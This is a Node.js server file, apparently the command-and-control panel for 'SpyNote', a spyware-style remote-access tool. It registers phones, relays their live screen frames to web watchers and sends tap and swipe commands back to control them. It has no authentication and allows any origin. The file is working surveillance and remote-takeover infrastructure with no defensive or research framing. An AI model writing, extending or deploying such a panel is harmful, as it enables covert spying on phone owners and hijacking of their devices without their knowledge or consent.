const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 10000,
    pingInterval: 5000,
    maxHttpBufferSize: 100 * 1024 * 1024
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
        console.log("✅ Device registered:", deviceId);
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Web client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            socket.join(deviceId); // ✅ Device socket joins its own room
            io.emit('devices-update', Array.from(devices.entries()));
            console.log("📱 Device registered:", deviceId);
        }
    });

    // 🔥 FIXED: Screen streaming - Broadcast to ALL clients in device room
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            // ✅ Broadcast to ALL clients watching this device (including newly selected)
            socket.to(deviceId).emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp
            });
            // Debug log
            if (Math.random() < 0.033) {
                console.log('📺 Frame relayed to', deviceId, 'Size:', (data.data.length/1024).toFixed(1)+'KB');
            }
        }
    });

    // 🔥 FIXED: Control commands - Send to specific device room
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            // ✅ Send to specific device room
            io.to(deviceId).emit('control', {
                action, 
                x: parseFloat(x)||0, 
                y: parseFloat(y)||0,
                startX: parseFloat(startX)||0, 
                startY: parseFloat(startY)||0,
                endX: parseFloat(endX)||0, 
                endY: parseFloat(endY)||0
            });
            console.log('🎮 Control:', action, '→', deviceId);
        }
    });

    // 🔥 NEW: Web client watching specific device
    socket.on('watch-device', (deviceId) => {
        console.log('👁️ Web client watching:', deviceId);
        socket.join(deviceId); // ✅ Web client joins device room
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device disconnected:', deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
    console.log(`📱 Multi-device ready!`);
});
